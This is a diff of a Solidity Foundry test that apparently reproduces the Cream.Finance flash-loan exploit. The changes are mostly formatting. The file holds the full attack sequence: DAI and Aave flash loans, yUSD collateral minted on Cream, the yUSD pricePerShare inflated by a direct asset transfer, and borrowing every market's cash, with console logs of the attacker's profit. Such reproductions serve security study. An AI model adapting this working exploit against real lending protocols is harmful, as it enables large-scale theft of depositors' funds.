@@ -22,57 +22,58 @@ import {IWETH} from "src/interfaces/IWETH.sol";
 interface YDAI is IWETH {}
 
 interface YVaultPeakProxy {
+
     function redeemInYusd(uint256 dusdAmout, uint256 minOut) external;
+
 }
 
 interface IYearnVault {
+
     function deposit(uint256 amount) external;
     function withdraw(uint256 amount) external;
     function pricePerShare() external view returns (uint256);
     function totalAssets() external view returns (uint256);
+
 }
 
 interface ICurveDepositor {
-    function add_liquidity(
-        uint256[4] memory amounts,
-        uint256 min_mint_amount
-    ) external;
-    function remove_liquidity_imbalance(
-        uint256[4] memory amounts,
-        uint256 max_burn_amount
-    ) external;
-    function remove_liquidity_one_coin(
-        uint256 _token_amount,
-        int128 i,
-        uint256 min_uamount,
-        bool donate_dust
-    ) external;
+
+    function add_liquidity(uint256[4] memory amounts, uint256 min_mint_amount) external;
+    function remove_liquidity_imbalance(uint256[4] memory amounts, uint256 max_burn_amount) external;
+    function remove_liquidity_one_coin(uint256 _token_amount, int128 i, uint256 min_uamount, bool donate_dust)
+        external;
+
 }
 
 interface ICether {
+
     function borrow(uint256 borrowAmount) external returns (uint256);
     function mint() external payable;
     function underlying() external view returns (address);
+
 }
 
 interface ICrToken {
+
     function borrow(uint256 borrowAmount) external;
     function mint(uint256 mintAmount) external;
     function underlying() external view returns (address);
     function getCash() external view returns (uint256);
+
 }
 
 interface IComptroller {
+
     function enterMarkets(address[] memory cTokens) external;
     // function getAccountLiquidity() external view returns(address[] memory markets);
+
 }
 
 contract SecondContract {
+
     address contractAddress;
-    IComptroller comptroller =
-        IComptroller(0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258);
-    IAaveFlashloan AaveFlash =
-        IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
+    IComptroller comptroller = IComptroller(0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258);
+    IAaveFlashloan AaveFlash = IAaveFlashloan(0x7d2768dE32b0b80b7a3454c06BdAc94A69DDc7A9);
     address constant yUSD = 0x4B5BfD52124784745c1071dcB244C6688d2533d3;
     address constant crYUSD = 0x4BAa77013ccD6705ab0522853cB0E9d453579Dd4;
     address constant aWETH = 0x030bA81f1c18d280636F32af80b9AAd02Cf0854e;
@@ -88,15 +89,7 @@ contract SecondContract {
         uint256[] memory modes = new uint256[](1);
         modes[0] = 0;
         console.log("[7. Aave FlashLoan 524_102 WETH]");
-        AaveFlash.flashLoan(
-            address(this),
-            assets,
-            amounts,
-            modes,
-            address(this),
-            "",
-            0
-        );
+        AaveFlash.flashLoan(address(this), assets, amounts, modes, address(this), "", 0);
     }
 
     function executeOperation(
@@ -110,12 +103,8 @@ contract SecondContract {
         console.log("[8. Transfer 6000 WETH to first contract]");
         WETH.transfer(contractAddress, 6000 * 1e18);
 
-        console.log(
-            "[9. Convert WETH->ETH->crETH, the second contract collateral in Cream.Finance]"
-        );
-        (bool success, ) = address(WETH).call(
-            abi.encodeWithSignature("withdraw(uint256)", 518_102 * 1e18)
-        );
+        console.log("[9. Convert WETH->ETH->crETH, the second contract collateral in Cream.Finance]");
+        (bool success,) = address(WETH).call(abi.encodeWithSignature("withdraw(uint256)", 518_102 * 1e18));
         ICether(crETH).mint{value: 518_102 ether}();
 
         console.log("[10. Cream.Finance crETH enterMarket]");
@@ -130,32 +119,18 @@ contract SecondContract {
         IERC20(yUSD).approve(crYUSD, type(uint256).max);
         ICrToken(crYUSD).borrow(IERC20(yUSD).balanceOf(crYUSD));
         ICrToken(crYUSD).mint(IERC20(yUSD).balanceOf(address(this)));
-        IERC20(crYUSD).transfer(
-            contractAddress,
-            IERC20(crYUSD).balanceOf(address(this))
-        );
+        IERC20(crYUSD).transfer(contractAddress, IERC20(crYUSD).balanceOf(address(this)));
         ICrToken(crYUSD).borrow(IERC20(yUSD).balanceOf(crYUSD));
         ICrToken(crYUSD).mint(IERC20(yUSD).balanceOf(address(this)));
-        IERC20(crYUSD).transfer(
-            contractAddress,
-            IERC20(crYUSD).balanceOf(address(this))
-        );
-        console.log(
-            "The crYUSD amount in first contract: ",
-            IERC20(crYUSD).balanceOf(contractAddress) / 1e8
-        );
+        IERC20(crYUSD).transfer(contractAddress, IERC20(crYUSD).balanceOf(address(this)));
+        console.log("The crYUSD amount in first contract: ", IERC20(crYUSD).balanceOf(contractAddress) / 1e8);
 
         console.log("[12. borrow yUSD and send to first contract]");
         ICrToken(crYUSD).borrow(IERC20(yUSD).balanceOf(crYUSD));
-        IERC20(yUSD).transfer(
-            contractAddress,
-            IERC20(yUSD).balanceOf(address(this))
-        );
+        IERC20(yUSD).transfer(contractAddress, IERC20(yUSD).balanceOf(address(this)));
 
         console.log("------------Jump first contract------------");
-        (bool success1, ) = contractAddress.call(
-            abi.encodeWithSignature("doIt()")
-        );
+        (bool success1,) = contractAddress.call(abi.encodeWithSignature("doIt()"));
 
         console.log("[15. Repay Aave FlashLoan]");
         WETH.approve(address(AaveFlash), type(uint256).max);
@@ -163,37 +138,29 @@ contract SecondContract {
     }
 
     receive() external payable {}
+
 }
 
 interface IDaiFlashloan {
-    function flashLoan(
-        address receiver,
-        address token,
-        uint256 amount,
-        bytes calldata data
-    ) external returns (bool);
+
+    function flashLoan(address receiver, address token, uint256 amount, bytes calldata data) external returns (bool);
+
 }
 
 contract ContractTest is Test {
-    IDaiFlashloan DaiFlash =
-        IDaiFlashloan(0x1EB4CF3A948E7D72A198fe073cCb8C7a948cD853);
-    ICurvePool curvePool =
-        ICurvePool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
-    IComptroller comptroller =
-        IComptroller(0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258);
-    ICurveDepositor curveDepositors =
-        ICurveDepositor(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
+
+    IDaiFlashloan DaiFlash = IDaiFlashloan(0x1EB4CF3A948E7D72A198fe073cCb8C7a948cD853);
+    ICurvePool curvePool = ICurvePool(0xbEbc44782C7dB0a1A60Cb6fe97d0b483032FF1C7);
+    IComptroller comptroller = IComptroller(0x3d5BC3c8d13dcB8bF317092d84783c2697AE9258);
+    ICurveDepositor curveDepositors = ICurveDepositor(0x45F783CCE6B7FF23B2ab2D70e416cdb7D6055f51);
     YDAI yDAI = YDAI(0x16de59092dAE5CcF4A1E6439D611fd0653f0Bd01);
-    IUniswapV3Router Router =
-        IUniswapV3Router(payable(0xE592427A0AEce92De3Edee1F18E0157C05861564));
+    IUniswapV3Router Router = IUniswapV3Router(payable(0xE592427A0AEce92De3Edee1F18E0157C05861564));
     IERC20 DAI = IERC20(0x6B175474E89094C44Da98b954EedeAC495271d0F);
     IERC20 WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     IERC20 DUSD = IERC20(0x5BC25f649fc4e26069dDF4cF4010F9f706c23831);
     IERC20 USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
-    IERC20 yDAI_yUSDC_yUSDT_yTUSD =
-        IERC20(0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8);
-    address constant curveDepositor =
-        0xbBC81d23Ea2c3ec7e56D39296F0cbB648873a5d3;
+    IERC20 yDAI_yUSDC_yUSDT_yTUSD = IERC20(0xdF5e0e81Dff6FAF3A7e52BA697820c5e32D806A8);
+    address constant curveDepositor = 0xbBC81d23Ea2c3ec7e56D39296F0cbB648873a5d3;
     address constant yUSD = 0x4B5BfD52124784745c1071dcB244C6688d2533d3;
     address constant crYUSD = 0x4BAa77013ccD6705ab0522853cB0E9d453579Dd4;
     address constant DUSDPOOL = 0x8038C01A0390a8c547446a0b2c18fc9aEFEcc10c;
@@ -229,79 +196,28 @@ contract ContractTest is Test {
 
         console.log("[17. End]");
         console.log("------------Proift------------");
-        console.log(
-            "Attacker WETH balance after exploit: ",
-            WETH.balanceOf(address(this)) / 1e18
-        );
-        console.log(
-            "Attacker crDAI balance after exploit: ",
-            withdrawUnderlying(crDAI) / 1e18
-        );
-        console.log(
-            "Attacker crUSDT balance after exploit: ",
-            withdrawUnderlying(crUSDT) / 1e6
-        );
-        console.log(
-            "Attacker crUSDC balance after exploit: ",
-            withdrawUnderlying(crUSDC) / 1e6
-        );
-        console.log(
-            "Attacker crETH balance after exploit: ",
-            withdrawUnderlying(crCRETH2) / 1e18
-        );
-        console.log(
-            "Attacker crCRETH2 balance after exploit: ",
-            withdrawUnderlying(crDAI) / 1e18
-        );
-        console.log(
-            "Attacker crFEI balance after exploit: ",
-            withdrawUnderlying(crFEI) / 1e18
-        );
-        console.log(
-            "Attacker crFTT balance after exploit: ",
-            withdrawUnderlying(crFTT) / 1e18
-        );
-        console.log(
-            "Attacker crPERP balance after exploit: ",
-            withdrawUnderlying(crPERP) / 1e18
-        );
-        console.log(
-            "Attacker crRUNE balance after exploit: ",
-            withdrawUnderlying(crRUNE) / 1e18
-        );
-        console.log(
-            "Attacker crDPI balance after exploit: ",
-            withdrawUnderlying(crDPI) / 1e18
-        );
-        console.log(
-            "Attacker crUNI balance after exploit: ",
-            withdrawUnderlying(crUNI) / 1e18
-        );
-        console.log(
-            "Attacker crGNO balance after exploit: ",
-            withdrawUnderlying(crGNO) / 1e18
-        );
-        console.log(
-            "Attacker crXSUSHI balance after exploit: ",
-            withdrawUnderlying(crXSUSHI) / 1e18
-        );
-        console.log(
-            "Attacker crSTETH balance after exploit: ",
-            withdrawUnderlying(crSTETH) / 1e18
-        );
-        console.log(
-            "Attacker crYGG balance after exploit: ",
-            withdrawUnderlying(crYGG) / 1e18
-        );
+        console.log("Attacker WETH balance after exploit: ", WETH.balanceOf(address(this)) / 1e18);
+        console.log("Attacker crDAI balance after exploit: ", withdrawUnderlying(crDAI) / 1e18);
+        console.log("Attacker crUSDT balance after exploit: ", withdrawUnderlying(crUSDT) / 1e6);
+        console.log("Attacker crUSDC balance after exploit: ", withdrawUnderlying(crUSDC) / 1e6);
+        console.log("Attacker crETH balance after exploit: ", withdrawUnderlying(crCRETH2) / 1e18);
+        console.log("Attacker crCRETH2 balance after exploit: ", withdrawUnderlying(crDAI) / 1e18);
+        console.log("Attacker crFEI balance after exploit: ", withdrawUnderlying(crFEI) / 1e18);
+        console.log("Attacker crFTT balance after exploit: ", withdrawUnderlying(crFTT) / 1e18);
+        console.log("Attacker crPERP balance after exploit: ", withdrawUnderlying(crPERP) / 1e18);
+        console.log("Attacker crRUNE balance after exploit: ", withdrawUnderlying(crRUNE) / 1e18);
+        console.log("Attacker crDPI balance after exploit: ", withdrawUnderlying(crDPI) / 1e18);
+        console.log("Attacker crUNI balance after exploit: ", withdrawUnderlying(crUNI) / 1e18);
+        console.log("Attacker crGNO balance after exploit: ", withdrawUnderlying(crGNO) / 1e18);
+        console.log("Attacker crXSUSHI balance after exploit: ", withdrawUnderlying(crXSUSHI) / 1e18);
+        console.log("Attacker crSTETH balance after exploit: ", withdrawUnderlying(crSTETH) / 1e18);
+        console.log("Attacker crYGG balance after exploit: ", withdrawUnderlying(crYGG) / 1e18);
     }
 
-    function onFlashLoan(
-        address initiator,
-        address token,
-        uint256 amount,
-        uint256 fee,
-        bytes calldata data
-    ) external returns (bytes32) {
+    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data)
+        external
+        returns (bytes32)
+    {
         // console.log("The DAI amount in contract: ", DAI.balanceOf(address(this))  / 1e18);
 
         console.log("[3. deposit DAI to YearnVault get yDAI]");
@@ -318,36 +234,24 @@ contract ContractTest is Test {
 
         console.log("[4. deposit yDAI_yUSDC_yUSDT_yTUSD to get yUSD]");
         yDAI_yUSDC_yUSDT_yTUSD.approve(yUSD, type(uint256).max);
-        IYearnVault(yUSD).deposit(
-            yDAI_yUSDC_yUSDT_yTUSD.balanceOf(address(this))
-        );
+        IYearnVault(yUSD).deposit(yDAI_yUSDC_yUSDT_yTUSD.balanceOf(address(this)));
         // console.log("The yUSD amount: ", IERC20(yUSD).balanceOf(address(this)) / 1e18);
 
-        console.log(
-            "[5. use yUSD to mint crYUSD, the first contract collateral in Cream.Finance]"
-        );
+        console.log("[5. use yUSD to mint crYUSD, the first contract collateral in Cream.Finance]");
         IERC20(yUSD).approve(crYUSD, type(uint256).max);
         ICrToken(crYUSD).mint(IERC20(yUSD).balanceOf(address(this)));
-        console.log(
-            "The crYUSD amount in first contract: ",
-            IERC20(crYUSD).balanceOf(address(this)) / 1e8
-        );
+        console.log("The crYUSD amount in first contract: ", IERC20(crYUSD).balanceOf(address(this)) / 1e8);
 
         console.log("[6. Cream.Finance crYUSD enterMarket]");
         address[] memory markets = new address[](1);
         markets[0] = crYUSD;
         comptroller.enterMarkets(markets);
         console.log("------------Jump second Contract------------");
-        (bool sucess5, ) = secondContract.call(
-            abi.encodeWithSignature("justDoIt(address)", address(this))
-        );
+        (bool sucess5,) = secondContract.call(abi.encodeWithSignature("justDoIt(address)", address(this)));
 
         console.log("[16. Repay DAI FlashLoan]");
         amounts[0] = 445_331_495_265_152_128_661_273_376;
-        curveDepositors.remove_liquidity_imbalance(
-            amounts,
-            yDAI_yUSDC_yUSDT_yTUSD.balanceOf(address(this))
-        );
+        curveDepositors.remove_liquidity_imbalance(amounts, yDAI_yUSDC_yUSDT_yTUSD.balanceOf(address(this)));
         yDAI.withdraw(yDAI.balanceOf(address(this)));
         USDCToDAI();
         // console.log("The DAI amount: ", DAI.balanceOf(address(this)) /1e18);
@@ -361,65 +265,51 @@ contract ContractTest is Test {
         USDC.approve(DUSDPOOL, type(uint256).max);
         IcurveYSwap(DUSDPOOL).exchange_underlying(2, 0, 3_726_501_383_126, 0);
         DUSD.approve(PeakProxy, type(uint256).max);
-        YVaultPeakProxy(PeakProxy).redeemInYusd(
-            DUSD.balanceOf(address(this)),
-            0
-        );
-        console.log(
-            "The yUSD amount in first contract: ",
-            IERC20(yUSD).balanceOf(address(this)) / 1e18
-        );
+        YVaultPeakProxy(PeakProxy).redeemInYusd(DUSD.balanceOf(address(this)), 0);
+        console.log("The yUSD amount in first contract: ", IERC20(yUSD).balanceOf(address(this)) / 1e18);
 
         console.log("------------Inflation------------");
         console.log("[13. Pump the pricePerShare]");
-        console.log(
-            "pricepershare start : ",
-            IYearnVault(yUSD).pricePerShare() / 1e18
-        );
+        console.log("pricepershare start : ", IYearnVault(yUSD).pricePerShare() / 1e18);
         IYearnVault(yUSD).withdraw(IERC20(yUSD).balanceOf(address(this)));
         // withdraw yUSD to yDAI_yUSDC_yUSDT_yTUSD
         yDAI_yUSDC_yUSDT_yTUSD.transfer(yUSD, IYearnVault(yUSD).totalAssets());
-        console.log(
-            "pricepershare end : ",
-            IYearnVault(yUSD).pricePerShare() / 1e18
-        );
+        console.log("pricepershare end : ", IYearnVault(yUSD).pricePerShare() / 1e18);
 
         console.log("------------HeistAndRepay------------");
         console.log("[14. borrow token from Cream.Finance]");
         borrowAll();
-        (bool sucess, ) = address(WETH).call{value: 523_208 ether}("");
+        (bool sucess,) = address(WETH).call{value: 523_208 ether}("");
         WETH.transfer(secondContract, 524_574 * 1e18);
     }
 
     function WETHToUSDC() internal {
         WETH.approve(address(Router), type(uint256).max);
-        IUniswapV3Router.ExactOutputSingleParams
-            memory _Params = IUniswapV3Router.ExactOutputSingleParams({
-                tokenIn: address(WETH),
-                tokenOut: address(USDC),
-                fee: 3000,
-                recipient: address(this),
-                deadline: block.timestamp,
-                amountOut: 7_500_000 * 1e6,
-                amountInMaximum: 5000 * 1e18,
-                sqrtPriceLimitX96: 0
-            });
+        IUniswapV3Router.ExactOutputSingleParams memory _Params = IUniswapV3Router.ExactOutputSingleParams({
+            tokenIn: address(WETH),
+            tokenOut: address(USDC),
+            fee: 3000,
+            recipient: address(this),
+            deadline: block.timestamp,
+            amountOut: 7_500_000 * 1e6,
+            amountInMaximum: 5000 * 1e18,
+            sqrtPriceLimitX96: 0
+        });
         Router.exactOutputSingle(_Params);
     }
 
     function USDCToDAI() internal {
         USDC.approve(address(Router), type(uint256).max);
-        IUniswapV3Router.ExactOutputSingleParams
-            memory _Params = IUniswapV3Router.ExactOutputSingleParams({
-                tokenIn: address(USDC),
-                tokenOut: address(DAI),
-                fee: 500,
-                recipient: address(this),
-                deadline: block.timestamp,
-                amountOut: 6_356_555 * 1e18,
-                amountInMaximum: 6_451_883 * 1e18,
-                sqrtPriceLimitX96: 0
-            });
+        IUniswapV3Router.ExactOutputSingleParams memory _Params = IUniswapV3Router.ExactOutputSingleParams({
+            tokenIn: address(USDC),
+            tokenOut: address(DAI),
+            fee: 500,
+            recipient: address(this),
+            deadline: block.timestamp,
+            amountOut: 6_356_555 * 1e18,
+            amountInMaximum: 6_451_883 * 1e18,
+            sqrtPriceLimitX96: 0
+        });
         Router.exactOutputSingle(_Params);
     }
 
@@ -449,12 +339,11 @@ contract ContractTest is Test {
         ICrToken(token).borrow(ICrToken(token).getCash());
     }
 
-    function withdrawUnderlying(
-        address token
-    ) public view returns (uint256 amount) {
+    function withdrawUnderlying(address token) public view returns (uint256 amount) {
         address underlying = ICrToken(token).underlying();
         amount = IERC20(underlying).balanceOf(address(this));
     }
 
     receive() external payable {}
+
 }
